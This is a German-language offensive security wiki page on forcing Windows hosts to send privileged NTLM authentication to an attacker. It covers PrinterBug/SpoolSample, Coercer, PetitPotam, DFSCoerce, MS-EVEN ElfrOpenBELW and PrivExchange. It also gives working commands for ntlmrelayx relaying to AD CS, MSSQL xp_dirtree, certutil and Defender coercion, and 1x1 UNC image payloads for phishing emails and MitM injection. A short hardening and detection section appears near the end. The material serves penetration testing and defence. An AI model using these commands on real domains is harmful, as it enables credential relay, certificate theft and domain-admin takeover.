# Erzwingen privilegierter NTLM-Authentifizierung

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von in C# mit dem MIDL-Compiler entwickelten **Triggern für Remote-Authentifizierung**, die Abhängigkeiten von Drittanbietern vermeiden.

## Missbrauch des Spooler-Dienstes

Wenn der _**Print Spooler**_-Dienst **aktiviert** ist, kannst du bereits bekannte AD-Anmeldedaten verwenden, um beim Druckserver des Domain Controllers eine **Aktualisierung** zu neuen Druckaufträgen **anzufordern** und ihn anweisen, die Benachrichtigung an ein beliebiges System zu **senden**.\
Beachte, dass sich der Drucker **authentifizieren** muss, wenn er die Benachrichtigung an beliebige Systeme sendet. Ein Angreifer kann den _**Print Spooler**_-Dienst daher dazu bringen, sich bei einem beliebigen System zu authentifizieren. Dabei **verwendet** der Dienst das **Computerkonto** für die Authentifizierung.

Im Hintergrund missbraucht das klassische **PrinterBug**-Primitiv **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zunächst einen Drucker-/Server-Handle und übergibt dann einen gefälschten Clientnamen in `pszLocalMachine`, sodass der Ziel-Spooler einen Benachrichtigungskanal **zum vom Angreifer kontrollierten Host** erstellt. Deshalb handelt es sich um das **Erzwingen ausgehender Authentifizierung** und nicht um direkte Codeausführung.<sup>[[2]](#references)</sup>\
Wenn du nach **RCE/LPE** im Spooler selbst suchst, sieh dir [PrintNightmare](printnightmare.md) an. Diese Seite konzentriert sich auf **Coercion und Relay**.

### Windows-Server in der Domäne finden

Verwende PowerShell, um Windows-Hosts aufzulisten. Server haben normalerweise die höchste Priorität als Ziele. Konzentriere dich daher zuerst auf sie:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Spooler-Dienste finden, die lauschen

Prüfe mit einer leicht modifizierten Version von @mysmartlogin's (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), ob der Spooler Service lauscht:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Du kannst unter Linux auch `rpcdump.py` verwenden und nach dem **MS-RPRN**-Protokoll suchen:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Oder Hosts schnell von Linux aus mit **NetExec/CrackMapExec** testen:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Wenn du **Coercion-Angriffsflächen enumerieren** möchtest, statt nur zu prüfen, ob der Spooler-Endpunkt existiert, verwende den **Coercer-Scan-Modus**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Das ist nützlich, denn der Endpunkt in EPM zeigt lediglich, dass die Print-RPC-Schnittstelle registriert ist. Es **garantiert nicht**, dass jede Coercion-Methode mit deinen aktuellen Berechtigungen erreichbar ist oder dass der Host einen nutzbaren Authentifizierungsablauf auslöst.

### Den Dienst auffordern, sich bei einem beliebigen Host zu authentifizieren

Du kannst [SpoolSample aus dem ursprünglichen Repository](https://github.com/leechristensen/SpoolSample) kompilieren.

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du Linux verwendest

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Mit **Coercer** kannst du die Spooler-Schnittstellen direkt ansprechen und musst nicht erraten, welche RPC-Methode verfügbar ist:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Moderne RPC-over-TCP-Callbacks

Gehe nicht davon aus, dass ein erfolgreicher Aufruf von `RpcRemoteFindFirstPrinterChangeNotificationEx` zwingend Datenverkehr über TCP/445 erzeugt. **Windows 11 22H2 und höher verwenden standardmäßig RPC over TCP für die Druckkommunikation**; RPC über Named Pipes ist deaktiviert, sofern es nicht durch eine Richtlinie oder `RpcUseNamedPipeProtocol=1` wieder aktiviert wird. Daher können ältere SMB-only-Listener melden, dass der Trigger gesendet wurde, ohne jemals den Callback zu empfangen. Microsoft dokumentiert TCP/135 (Endpoint Mapper) sowie dynamische RPC-Ports für normale Druck-RPC-Kommunikation. Unternehmen können diesen Bereich einschränken oder einen festen Druck-RPC-Port festlegen.<sup>[[10]](#references)</sup>

**Impacket `ntlmrelayx.py`** enthält aktuell einen RPC-Relay-Server und einen kleinen Endpoint Mapper, der standardmäßig auf TCP/135 aktiviert ist. Diese Unterstützung wurde im Juni 2025 speziell mit einer demonstrierten PrinterBug-to-AD-CS-Kette integriert. Dadurch kann der authentifizierte RPC-Callback weitergeleitet werden, selbst wenn das Opfer nicht auf SMB/WebDAV zurückfällt.<sup>[[11]](#references)</sup>

RPC-Relay/EPM-Unterstützung ist in **Impacket 0.13.0 und höher** enthalten. Bevor du einen fehlenden TCP/135-Listener untersuchst, prüfe, ob nicht eine ältere, paketierte Version von `ntlmrelayx.py` ausgeführt wird. Die Hilfeausgabe sollte beide RPC-Server-Schalter anzeigen.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Suche in der Relay-Ausgabe nach `Setting up RPC Server on port 135` und `RPCD: Received connection`. Wenn der RPC-Aufruf einen erwarteten Fehler zurückgibt, aber nichts beim Listener ankommt, überprüfe die Print-RPC-Transport-Policy des Opfers, ausgehende Filterregeln, die DNS-Auflösung und ob ein anderer Prozess bereits TCP/135 belegt. Stelle außerdem sicher, dass `ntlmrelayx` nicht mit `--no-rpc-server` gestartet wurde.

### HTTP statt SMB mit WebClient erzwingen

Auf Systemen, die weiterhin **RPC über Named Pipes** verwenden (ältere Builds oder durch Richtlinien wiederhergestelltes Verhalten), führt der klassische PrinterBug normalerweise zu einer **SMB**-Authentifizierung bei `\\attacker\share`, was weiterhin für **capture**, **relay zu HTTP-Zielen** oder **relay, wenn SMB signing fehlt**, nützlich ist.\
Das Relay von **SMB zu SMB** wird jedoch häufig durch **SMB signing** verhindert. Daher ziehen Operatoren es möglicherweise vor, stattdessen eine **HTTP/WebDAV**-Authentifizierung zu erzwingen. Dies ist keine Ausweichlösung für das oben beschriebene Verhalten mit RPC over TCP.

Wenn der Dienst **WebClient** auf dem Ziel läuft, kann der Listener in einem Format angegeben werden, das Windows dazu veranlasst, **WebDAV über HTTP** zu verwenden:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Dies ist besonders nützlich in Kombination mit **`ntlmrelayx --adcs`** oder anderen HTTP-Relay-Zielen, da so keine SMB-Relaybarkeit der erzwungenen Verbindung vorausgesetzt werden muss. Der wichtige Vorbehalt: **WebClient muss auf dem Opfer laufen**, damit die HTTP/WebDAV-Variante funktioniert.

### Kombination mit Unconstrained Delegation

Wenn ein Angreifer einen Computer kompromittiert hat, der für [Unconstrained Delegation](unconstrained-delegation.md) konfiguriert ist, kann er **den Drucker dazu zwingen, sich bei diesem Computer zu authentifizieren**. Das **TGT** des Drucker-Computerkontos wird dann im Arbeitsspeicher des Hosts mit Unconstrained Delegation zwischengespeichert. Der Angreifer kann es dort abrufen und mit [Pass the Ticket](pass-the-ticket.md) wiederverwenden.

### Hinweise zu Erkennung und Härtung

Am zuverlässigsten lässt sich PrinterBug von einem DC, PAW oder Server entfernen, auf dem nicht gedruckt wird, indem der Spooler angehalten und deaktiviert wird. Wenn Drucken erforderlich ist, sollten alle möglichen Relay-Ziele gehärtet werden (SMB-Server-Signing, LDAP-Signing/Channel-Binding und EPA bei HTTP-Diensten wie AD CS), statt anzunehmen, dass das Blockieren von TCP/445 auf dem Callback-Pfad ausreicht.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Wenn der Host weiterhin **lokales Drucken** benötigt, bietet die GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` eine gezieltere Kontrolle. Dadurch nimmt der Spooler keine Remote-Clientverbindungen (und keine Druckerfreigaben) mehr an, während der Dienst lokal verfügbar bleibt. Starten Sie den Spooler nach der Anwendung neu und wiederholen Sie anschließend die oben genannten MS-RPRN-Erreichbarkeitstests.<sup>[[13]](#references)</sup>

Bei der Erkennung sollte ein authentifizierter Aufruf der MS-RPRN-UUID `12345678-1234-abcd-ef00-0123456789ab` mit einer unmittelbar darauf folgenden ausgehenden SMB-, HTTP- oder RPC-Verbindung vom Spooler-Host korreliert werden, insbesondere opnum 62/65 mit einem nicht lokalen Callback-Wert. Erfassen Sie als Baseline **Interface-UUID/opnum sowie Quell-/Ziel-Paare** und nicht nur den Zugriff auf `\PIPE\spoolss`, da aktuelle Print-Stacks den Callback über RPC-over-TCP abwickeln können.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC-UNC-Pfad-Coercion-Matrix (Interfaces/opnums, die ausgehende Authentifizierung auslösen)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Hinweise: Asynchrones Print-Interface über dieselbe Spooler-Pipe; verwenden Sie Coercer, um die auf einem bestimmten Host erreichbaren Methoden aufzulisten<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (auch über \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Häufig missbrauchte Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei der Verarbeitung authentifiziert sich Windows (im Kontext des Computers/Benutzers) gegenüber diesem UNC-Pfad. Dadurch können NetNTLM-Credentials erfasst oder weitergeleitet werden.\
Bei Spooler-Abuse ist **MS-RPRN opnum 65** weiterhin die am häufigsten verwendete und am besten dokumentierte Primitive, da die Protokollspezifikation ausdrücklich besagt, dass der Server einen Benachrichtigungskanal zurück zum durch `pszLocalMachine` angegebenen Client erstellt.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) Coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Aufrufsignatur: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Auswirkung: Das Ziel versucht, den angegebenen Backup-Log-Pfad zu öffnen, und authentifiziert sich gegenüber dem vom Angreifer kontrollierten UNC-Pfad.<sup>[[1]](#references)</sup>
- Praktischer Einsatz: Tier-0-Assets (DC/RODC/Citrix usw.) dazu bringen, NetNTLM auszugeben, und anschließend an AD-CS-Endpunkte (ESC8/ESC11-Szenarien) oder andere privilegierte Dienste weiterleiten.<sup>[[1]](#references)</sup>

## PrivExchange

Der `PrivExchange`-Angriff geht auf eine Schwachstelle in der **Exchange-Server-Funktion `PushSubscription`** zurück. Diese Funktion ermöglicht es jedem Domänenbenutzer mit einem Postfach, den Exchange-Server dazu zu zwingen, sich über HTTP bei einem beliebigen vom Client angegebenen Host zu authentifizieren.

Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und verfügt über übermäßige Berechtigungen (insbesondere über **WriteDacl-Berechtigungen für die Domäne vor dem Cumulative Update von 2019**). Diese Schwachstelle kann ausgenutzt werden, um **Informationen an LDAP weiterzuleiten und anschließend die NTDS-Datenbank der Domäne zu extrahieren**. Wenn eine Weiterleitung an LDAP nicht möglich ist, kann die Schwachstelle weiterhin dazu verwendet werden, die Authentifizierung an andere Hosts innerhalb der Domäne weiterzuleiten. Bei erfolgreicher Ausnutzung dieses Angriffs erhält ein beliebiges authentifiziertes Domänenbenutzerkonto sofortigen Zugriff als Domain Admin.

## Innerhalb von Windows

Wenn Sie bereits Zugriff auf den Windows-Rechner haben, können Sie Windows dazu zwingen, sich mit privilegierten Konten mit einem Server zu verbinden:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das lolbin certutil.exe (eine von Microsoft signierte Binärdatei) zu verwenden, um eine NTLM-Authentifizierung zu erzwingen:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Per E-Mail

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einem Computer anmeldet, den du kompromittieren möchtest, kannst du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, zum Beispiel:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Wenn das Opfer sie öffnet, versucht Windows, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff durchführen und HTML in eine vom Opfer aufgerufene Seite einschleusen kannst, versuche, ein Bild wie das folgende einzufügen:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Weitere Möglichkeiten, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracken

Wenn du [NTLMv1-Challenges abfangen kannst, erfährst du hier, wie du sie crackst](../ntlm/index.html#ntlmv1-attack).\
_Denk daran, dass du zum Cracken von NTLMv1 die Responder-Challenge auf „1122334455667788“ setzen musst._



## References

- [1] [Unit 42 – Die Authentifizierungs-Coercion entwickelt sich ständig weiter](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-Remoting-Protokoll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC-Verbindungsupdates für den Druck unter Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC-Relayserver und Endpoint Mapper für ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket Version 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Druckspooler für Clientverbindungen freigeben](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
